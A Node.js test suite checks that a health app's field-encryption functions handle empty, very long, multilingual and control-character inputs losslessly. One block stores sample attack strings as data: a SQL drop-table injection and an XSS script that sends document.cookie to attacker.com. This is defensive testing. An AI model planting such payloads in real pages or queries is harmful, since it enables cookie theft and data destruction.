/**
 * Tier 2 - Boundary & Corner Cases: Input Boundaries & Adversarial Payloads
 * (>=5 test cases per feature)
 */
import test from 'node:test';
import assert from 'node:assert';
import { loadSourceModule } from '../harness/loader.js';
import { isEncryptedFormat } from '../harness/crypto-tools.js';

let cryptoModule;

test.before(async () => {
  cryptoModule = await loadSourceModule('src/lib/crypto.ts');
});

test.describe('Tier 2 - Input Boundaries: Empty, Null, and Extreme Lengths', () => {
  test('TC-T2.1.1: Empty string returns empty string without crashing or encrypting', () => {
    assert.strictEqual(cryptoModule.encryptField(''), '');
    assert.strictEqual(cryptoModule.decryptField(''), '');
  });

  test('TC-T2.1.2: Whitespace-only string is preserved safely without corrupting whitespace', () => {
    const spaces = '   \t\n   ';
    // encryptField returns original or encrypted
    const enc = cryptoModule.encryptField(spaces);
    const dec = cryptoModule.decryptField(enc);
    assert.strictEqual(dec, spaces);
  });

  test('TC-T2.1.3: Null and undefined inputs return fallback empty string or null gracefully', () => {
    const encNull = cryptoModule.encryptField(null);
    assert.ok(encNull === null || encNull === '', `Expected null or '' but got ${encNull}`);
    const encUndef = cryptoModule.encryptField(undefined);
    assert.ok(encUndef === undefined || encUndef === '', `Expected undefined or '' but got ${encUndef}`);
    const decNull = cryptoModule.decryptField(null);
    assert.ok(decNull === null || decNull === '', `Expected null or '' but got ${decNull}`);
    const decUndef = cryptoModule.decryptField(undefined);
    assert.ok(decUndef === undefined || decUndef === '', `Expected undefined or '' but got ${decUndef}`);
  });

  test('TC-T2.1.4: Extreme length payload (100KB text) encrypts and decrypts with 100% fidelity', () => {
    const largeText = 'Relatório Médico Detalhado: '.repeat(4000); // ~112 KB
    const encrypted = cryptoModule.encryptField(largeText);

    assert.ok(isEncryptedFormat(encrypted));
    const decrypted = cryptoModule.decryptField(encrypted);
    assert.strictEqual(decrypted.length, largeText.length);
    assert.strictEqual(decrypted, largeText);
  });

  test('TC-T2.1.5: 500KB extreme text boundary stress test', () => {
    const hugeText = 'PosturalAssessmentDataBlock:'.repeat(18000); // ~500 KB
    const encrypted = cryptoModule.encryptField(hugeText);
    const decrypted = cryptoModule.decryptField(encrypted);
    assert.strictEqual(decrypted, hugeText);
  });
});

test.describe('Tier 2 - Input Boundaries: Unicode, Emojis & Internationalization', () => {
  test('TC-T2.2.1: Complex emojis and zero-width joiners encrypt and decrypt losslessly', () => {
    const emojiPayload = 'Aluna gestante 🧘‍♀️ com gêmeos 👶👶 em acompanhamento pós-parto ✨';
    const encrypted = cryptoModule.encryptField(emojiPayload);

    assert.ok(isEncryptedFormat(encrypted));
    const decrypted = cryptoModule.decryptField(encrypted);
    assert.strictEqual(decrypted, emojiPayload);
  });

  test('TC-T2.2.2: Brazilian Portuguese accents and diacritics (á, ç, õ, ê, ü) are preserved exactly', () => {
    const accents = 'Atenção às lesões congênitas: calcâneo, tíbia, vértebra e músculo piriforme.';
    const enc = cryptoModule.encryptField(accents);
    const dec = cryptoModule.decryptField(enc);
    assert.strictEqual(dec, accents);
  });

  test('TC-T2.2.3: Multilingual strings (Japanese, Cyrillic, Arabic, Chinese) survive encryption cycle', () => {
    const multiLang = '日本語の医療記録, Медицинская карта, سجل طبي, 医疗记录';
    const enc = cryptoModule.encryptField(multiLang);
    const dec = cryptoModule.decryptField(enc);
    assert.strictEqual(dec, multiLang);
  });

  test('TC-T2.2.4: Strings with null bytes and control characters (\\0, \\r\\n, \\t) preserve exact binary representation', () => {
    const controlChars = 'Linha 1\r\nLinha 2\tColuna 2\0CaractereNuloFinal';
    const enc = cryptoModule.encryptField(controlChars);
    const dec = cryptoModule.decryptField(enc);
    assert.strictEqual(dec, controlChars);
  });

  test('TC-T2.2.5: Deterministic hash (hashDeterministic) normalizes punctuation and accents consistently', () => {
    const cpfFormatted = '123.456.789-00';
    const cpfRaw = '12345678900';

    const hash1 = cryptoModule.hashDeterministic(cpfFormatted);
    const hash2 = cryptoModule.hashDeterministic(cpfRaw);

    assert.ok(hash1, 'Deterministic hash must not be empty');
    assert.strictEqual(hash1, hash2, 'Deterministic hash must match for formatted vs unformatted CPF');
  });
});

test.describe('Tier 2 - Input Boundaries: Injection & Meta-Character Attack Payloads', () => {
  test('TC-T2.3.1: SQL injection vectors (\' OR \'1\'=\'1; DROP TABLE Student; --) are safely encrypted and preserved as data', () => {
    const sqlInjection = "'; DROP TABLE \"Student\"; SELECT * FROM \"AdminUser\" WHERE '1'='1";
    const enc = cryptoModule.encryptField(sqlInjection);
    const dec = cryptoModule.decryptField(enc);
    assert.strictEqual(dec, sqlInjection);
  });

  test('TC-T2.3.2: XSS payloads (<script>alert(document.cookie)</script>) are treated as literal text in crypto', () => {
    const xss = '<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>';
    const enc = cryptoModule.encryptField(xss);
    const dec = cryptoModule.decryptField(enc);
    assert.strictEqual(dec, xss);
  });

  test('TC-T2.3.3: Format-string meta characters (enc:v1: within the text) do not break the parser', () => {
    // A patient notes text that coincidentally includes the substring "enc:v1:" in the middle
    const deceptiveText = 'Observação: paciente relatou enc:v1:codigo_antigo como referência médica.';
    const enc = cryptoModule.encryptField(deceptiveText);
    const dec = cryptoModule.decryptField(enc);
    assert.strictEqual(dec, deceptiveText);
  });

  test('TC-T2.3.4: JSON serialized object in sensitive field maintains syntax and nesting', () => {
    const jsonStr = JSON.stringify({
      lesoes: ['ombro', 'joelho'],
      cirurgias: [{ ano: 2020, tipo: 'menisco' }],
      urgencia: true,
    });

    const enc = cryptoModule.encryptField(jsonStr);
    const dec = cryptoModule.decryptField(enc);
    assert.strictEqual(dec, jsonStr);
    assert.deepStrictEqual(JSON.parse(dec), JSON.parse(jsonStr));
  });

  test('TC-T2.3.5: Colon delimiter stress test (text with hundreds of colons ::::)', () => {
    const manyColons = 'Campo:com:muitos:dois:pontos::::::::::fim';
    const enc = cryptoModule.encryptField(manyColons);
    const dec = cryptoModule.decryptField(enc);
    assert.strictEqual(dec, manyColons);
  });
});
